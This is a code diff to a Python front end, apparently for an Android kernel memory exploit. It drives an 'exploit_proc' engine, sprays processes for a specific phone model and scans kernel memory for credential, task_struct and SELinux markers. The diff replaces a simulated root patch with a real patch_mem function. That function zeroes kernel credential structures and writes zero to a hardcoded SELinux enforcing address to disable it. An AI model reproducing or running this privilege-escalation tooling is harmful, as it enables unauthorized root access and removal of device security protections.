@@ -34,7 +34,7 @@ class MemoryExplorerAI:
             b"KETO0422": "task_struct (Active Process Marker)",
             b"init_cred": "Kernel Root Credentials (Global)",
             b"selinux_enforcing": "SELinux Status Bit",
-            b"\x7fELF": "Kernel Executable Header (Base)",
+            b"\x7f" + b"ELF": "Kernel Executable Header (Base)",
             b"\xFD\x7B\xBF\xA9": "AArch64 Function Prologue (Code)"
         }
         
@@ -130,7 +130,6 @@ class MemoryExplorerAI:
         print("="*85)
 
     def _read_data_packet(self):
-        """Helper to read the new DATA protocol from engine"""
         line = self.exploit_proc.stdout.readline().decode().strip()
         if not line.startswith("DATA:"):
             return None
@@ -138,16 +137,10 @@ class MemoryExplorerAI:
         parts = line.split(":")
         va = int(parts[1], 16)
         size = int(parts[2])
-        
-        # Read raw binary data
         data = self.exploit_proc.stdout.read(size)
-        
-        # Read the DATA_END marker (and the newline before it if any)
-        # Engine sends \nDATA_END\n
         end_marker = self.exploit_proc.stdout.readline().decode().strip()
-        if not end_marker: # handle potential extra newline
+        if not end_marker:
              end_marker = self.exploit_proc.stdout.readline().decode().strip()
-             
         return data
 
     def read_page(self, va):
@@ -157,6 +150,16 @@ class MemoryExplorerAI:
             self.exploit_proc.stdin.flush()
             return self._read_data_packet()
         except: return None
+
+    def patch_mem(self, va, val):
+        if not self.exploit_proc: return "Engine not running"
+        try:
+            self.exploit_proc.stdin.write(f"patch {hex(va)} {hex(val)}\n".encode())
+            self.exploit_proc.stdin.flush()
+            line = self.exploit_proc.stdout.readline().decode().strip()
+            return line
+        except Exception as e:
+            return str(e)
 
     def show_detail(self, item_idx):
         if item_idx < 0 or item_idx >= len(self.found_items): return
@@ -178,14 +181,19 @@ class MemoryExplorerAI:
                 print(f" {i:04X} | {hex_row:<48} | {printable}")
             
             print("-" * 75)
-            print(" [P] Patch Root  [Enter] Back")
+            print(" [K] Patch Root (0)  [S] Patch SELinux (0)  [Enter] Back")
             choice = input("\n explorer > ").lower()
             if not choice: break
-            if choice == 'p':
-                print("[!] Patching simulation...")
+            if choice == 'k':
+                res = self.patch_mem(int(item['va'], 16), 0)
+                print(f"[!] Result: {res}")
                 time.sleep(1)
-                print("[+] Complete.")
-                input("Enter...")
+            if choice == 's':
+                # Example SELinux enforcing addr
+                selinux_addr = 0xffffffc002caa000 
+                res = self.patch_mem(selinux_addr, 0)
+                print(f"[!] Result: {res}")
+                time.sleep(1)
 
     def get_ram_usage(self):
         try:
@@ -217,7 +225,6 @@ class MemoryExplorerAI:
             return f"Error: {str(e)}"
 
     def run_spray(self, count=5000):
-        # Optimized spray for ROG 5S
         import ctypes
         libc = ctypes.CDLL(None)
         start_count = len(self.spray_procs)
@@ -306,7 +313,6 @@ class MemoryExplorerAI:
                         if "MATCH:" in line:
                             va = int(line.split(":")[1], 16)
                             data = self._read_data_packet()
-                            
                             if data:
                                 if not any(int(item['va'], 16) == va for item in self.found_items):
                                     self.found_items.append(self.classify_page(data, va))
